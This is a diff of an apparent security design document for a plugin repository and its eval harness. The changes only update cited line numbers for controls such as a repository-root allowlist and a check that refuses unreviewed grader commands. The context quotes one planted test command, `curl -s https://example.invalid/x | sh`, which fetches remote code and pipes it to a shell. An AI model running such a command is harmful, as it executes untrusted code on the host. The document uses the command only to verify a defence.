@@ -76,7 +76,7 @@ point of choosing that shape. It fails open if someone adds the new name to the 
 understanding it, and it fails open entirely under actor 2, who edits the checker in the same
 commit.
 
-**Landed.** `check_plugin_agent_dir` became `check_plugin_root` at `scripts/check_skills.py:712`.
+**Landed.** `check_plugin_agent_dir` became `check_plugin_root` at `scripts/check_skills.py:715`.
 It walks the repository root and fails on any entry that is not in `PLUGIN_ROOT_ALLOWED` (`:109`),
 skipping the local-only names in `PLUGIN_ROOT_IGNORED` (`:132`) that `.gitignore` already excludes.
 Verified against a planted `hooks/` and `.mcp.json`: both were reported and the check exited
@@ -176,8 +176,8 @@ is not a hypothetical: the whole reason to run an eval on a contributor branch i
 the contribution works.
 
 **Landed, as the refusal.** `require_reviewed_graders` at `evals/run_eval.py:744` runs before
-anything is graded, called from `cmd_tasks` (`:1354`), `cmd_agent_tasks` (`:1402`) and
-`cmd_regrade` (`:1581`), which are the only three subcommands that execute an assertion command.
+anything is graded, called from `cmd_tasks` (`:1370`), `cmd_agent_tasks` (`:1418`) and
+`cmd_regrade` (`:1599`), which are the only three subcommands that execute an assertion command.
 Four decisions in it are worth stating, because each one is a place the control could have been
 weaker:
 
@@ -194,7 +194,7 @@ weaker:
 
 Verified by planting `curl -s https://example.invalid/x | sh` into a suite's `assertions.json`:
 the run refused, named the file, and printed that command. The planted assertion was reverted.
-`--graders-reviewed` (`:2138`) is the waiver, and taking it is logged to stdout rather than
+`--graders-reviewed` (`:2158`) is the waiver, and taking it is logged to stdout rather than
 passing silently.
 
 **What it does not buy.** A reviewed command runs with exactly the reach it had before. This
@@ -229,7 +229,7 @@ measurement. The permission mode cannot be the control for a task run. The tool 
 is what shipped: `TASK_TOOLS` at `run_eval.py:104` allows Bash, the file tools and `Skill`, and
 `RunPermissions` at `:300` carries the tool list and the mode together so that widening the surface
 and suppressing prompts are two decisions rather than one `if/else` (`:346`-`:351`). `--all-tools`
-(`:1386`, `:2160`) restores the audited command line. The allowlist is derived from what the
+(`:1402`, `:2180`) restores the audited command line. The allowlist is derived from what the
 committed transcripts show tasks actually use, and it excludes what they show runs reaching but no
 task asks for: `WebFetch` thirty times on the 2026-07-28 `github-actions-security` stamp, plus one
 `ToolSearch` and one `ScheduleWakeup`. Two caveats. Those three `github-actions-security` tasks
@@ -271,7 +271,7 @@ while only one of them is fixed.
   and tag are not equivalent: a tag here is protected against deletion and force update, and a
   branch is a moving reference the next push changes.
 - **Every plugin entry declares the same `version`.** `.claude-plugin/marketplace.json` carries
-  `0.1.0` on all five, and `check_plugin_versions` at `scripts/check_skills.py:741` fails the
+  `0.1.0` on all five, and `check_plugin_versions` at `scripts/check_skills.py:744` fails the
   build when one is missing, is not `MAJOR.MINOR.PATCH`, or disagrees with the others. Verified
   against all three shapes; `claude plugin validate .` still passes.
 - **The tag protection is a file, not a settings page.** `.github/rulesets/release-tags.json`
@@ -545,7 +545,7 @@ is where the work resumes, and it needs the tag from step 6, which exists as `v0
    `skills/github/github-actions-security/SKILL.md:239`-`:241` and `README.md:470` carry the
    digest from `lint.yml:147`.
 2. **Control 1**, allowlist the repository root. **Landed:** `check_plugin_root` at
-   `scripts/check_skills.py:712`. Attack path 1.3 is closed.
+   `scripts/check_skills.py:715`. Attack path 1.3 is closed.
 3. **Control 5**, invert the eval harness permission default. **Landed**, as a tool allowlist rather
    than a permission-mode change, for the reason in that control's note. Attack path 1.2 is
    narrowed, not closed.
